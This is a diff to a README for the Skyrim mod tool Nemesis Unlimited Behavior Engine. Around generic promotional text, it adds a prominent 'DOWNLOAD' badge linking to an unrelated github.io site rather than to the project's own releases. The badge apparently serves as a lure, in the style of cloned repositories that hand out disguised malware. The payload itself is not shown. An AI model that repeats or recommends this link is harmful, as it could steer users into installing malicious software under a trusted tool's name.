@@ -30,6 +30,12 @@ Nemesis Unlimited Behavior Engine patches Skyrim's HKX behaviour files to load c
 
 Whether you're a newcomer or a veteran, Nemesis Unlimited Behavior Engine provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Nemesis Unlimited Behavior Engine](https://img.shields.io/badge/⬇_DOWNLOAD_Nemesis+Unlimited+Behavior+Engine-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
